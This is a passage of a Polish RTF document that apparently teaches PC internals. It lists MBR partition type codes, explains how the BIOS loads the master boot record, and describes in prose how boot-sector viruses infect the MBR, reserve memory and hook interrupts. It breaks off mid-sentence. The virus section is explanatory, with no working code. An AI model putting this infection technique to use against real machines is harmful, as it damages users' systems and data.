\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}69h    Novell                _}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:61; bot-attach:62; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}70h    DiskSecure Multi-Boot}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:62; bot-attach:63; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}71h    zarezerwowana}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:63; bot-attach:64; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}73h    zarezerwowana}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:64; bot-attach:65; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}74h    zarezerwowana}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:65; bot-attach:66; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}75h    PC/lX}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:66; bot-attach:67; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}76h    zarezerwowana}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:67; bot-attach:68; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}80h    Minixv1,1 - 1.4a}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:68; bot-attach:69; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}81h    Minixv1.4b+}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:69; bot-attach:70; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}81h    Linux}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:70; bot-attach:71; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}81h    Mitac Advanced Disk Manager}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:71; bot-attach:72; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}82h    Linux Swap}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:72; bot-attach:73; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}82h    Prime}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:73; bot-attach:74; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}83h    Linux native file system}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:74; bot-attach:75; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}84h    OS/2}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:75; bot-attach:76; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}86h    zarezerwowana}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:76; bot-attach:77; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}87h    HPFS Fault-Tolerant}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:77; bot-attach:78; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}93h    Amoeba file system}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:78; bot-attach:79; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}94h    Amoeba bad b\uc1\u322\'b3ock table}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:79; bot-attach:80; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}A1h    zarezerwowana}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:80; bot-attach:81; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}A3h    zarezerwowana}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:81; bot-attach:82; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}A4h    zarezerwowana}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:82; bot-attach:83; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}A5h    FreeBSD}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:83; bot-attach:84; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}A6h    zarezerwowana}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:84; bot-attach:85; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}B1h    zarezerwowana}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:85; bot-attach:86; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}B3h    zarezerwowana}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:86; bot-attach:87; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}B4h    zarezerwowana}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:87; bot-attach:88; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}B6h    zarezerwowana}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:88; bot-attach:89; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}B7h    BSDI file system}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:89; bot-attach:90; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}B8h    BSDI plik wymiany}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:90; bot-attach:91; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}C1h    DR DOS 6.0 LOGIN.EXE 12-bit FAT}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:91; bot-attach:92; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}C4h    DR DOS 6.0 LOGIN.EXE 16-bit FAT}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:92; bot-attach:93; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}C6h    DR DOS 6.0 LOGlN.EXE Huge}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:93; bot-attach:94; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}C7h    Syrinx Boot}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:94; bot-attach:95; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}D8h    CP/M-86}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:95; bot-attach:96; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}DBh    CP/M}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:96; bot-attach:97; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}DBh    CTOS (ConvergentTechnologies OS)}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:97; bot-attach:98; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}E1h    SpeedStor 12-bit FAT rozszerzona partycja}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:98; bot-attach:99; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}E3h    DOS tylko do czytania}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:99; bot-attach:100; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}E3h    Storage Dimensions}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:100; bot-attach:101; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}E4h    SpeedStor 16-bit FAT rozszerzona partycja}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:101; bot-attach:102; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}E5h    zarezerwowana}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:102; bot-attach:103; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}E6h    zarezerwowana}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:103; bot-attach:104; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}F1h    Storage Dimensions}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:104; bot-attach:105; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}F2h    DOS 3.3+}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:105; bot-attach:106; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}F3h    zarezerwowana}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:106; bot-attach:107; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}F4h    SpeedStor}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:107; bot-attach:108; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}F4h    Storage Dimensions}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:108; bot-attach:109; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}F6h    zarezerwowana}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:109; bot-attach:110; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}FEh    LANstep}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:110; bot-attach:111; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}FEh    IBM PS/2 IML}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:111; bot-attach:112; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}FFh    Xenix}\cell{\*\abiendcell}\row}{\*\abiendtable}\par
\pard\plain\ltrpar\ql\itap0{\f3\fs20\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Po wykonaniu wszystkich autotest\'f3w BIOS wczytuje MBR zawsze pod ten sam, sta\uc1\u322\'b3y adres 0000:7C00 i wykonuje do tego miejsca daleki skok, przekazuj\uc1\u261\'b9c tym samym sterowanie do programu \uc1\u322\'b3aduj\uc1\u261\'b9cego, kt\'f3ry odszukuje stref\uc1\u281\'ea aktywn\uc1\u261\'b9 w tablicy partycji. Znalezienie strefy aktywnej polega na przeszukaniu tablicy partycji i sprawdzeniu, czy w polu 00h opisu badanej strefy znajduje si\uc1\u281\'ea warto\uc1\u347\'9c\uc1\u263\'e6 80h, co jest znakiem, i\uc1\u380\'bf jest to strefa aktywna i mo\uc1\u380\'bfna z niej za\uc1\u322\'b3adowa\uc1\u263\'e6 system operacyjny.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Dzia\uc1\u322\'b3anie wirus\'f3w zara\uc1\u380\'bfaj\uc1\u261\'b9cych MBR polega na podmianie oryginalnego programu w niej zawartego na kod wirusa. Oryginalna tablica partycji mo\uc1\u380\'bfe by\uc1\u263\'e6 przechowywana w innym sektorze na dysku. Najpro\uc1\u347\'9cciej Jest wczyta\uc1\u263\'e6 oryginalny sektor przy pomocy funkcji (02/13), dokona\uc1\u263\'e6 zm}{\f1\fs24\lang1045{\*\listtag0}i}{\f0\fs24\lang1045{\*\listtag0}an w jego strukturze i zapisa\uc1\u263\'e6 zmodyfikowany sektor z powrotem na dysk przy u\uc1\u380\'bfyciu funkcji (03/13).}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Po zara\uc1\u380\'bfeniu MBR wirus jest nieaktywny do czasu zresetowania komputera. Po restarcie zainfekowana partycja jest wczytywana przez BIOS pod adres 0000:7C00 i sterowanie jest oddawane do wirusa, kt\'f3ry zmniejsza pami\uc1\u281\'ea\uc1\u263\'e6 dost\uc1\u281\'eapn\uc1\u261\'b9 dla DOS-a (poprzez modyfikacj\uc1\u281\'ea zmiennej BIOS, zawartej pod adresem 0000:413), a nast\uc1\u281\'eapnie kopiuje si\uc1\u281\'ea na koniec pami\uc1\u281\'eaci, kt\'f3ra jest ju\uc1\u380\'bf niedost\uc1\u281\'eapna dla DOS-a. Stamt\uc1\u261\'b9d przejmuje obs\uc1\u322\'b3ug\uc1\u281\'ea pr}{\f1\fs24\lang1045{\*\listtag0}z}{\f0\fs24\lang1045{\*\listtag0}erwa\uc1\u324\'f1 i po wczytaniu 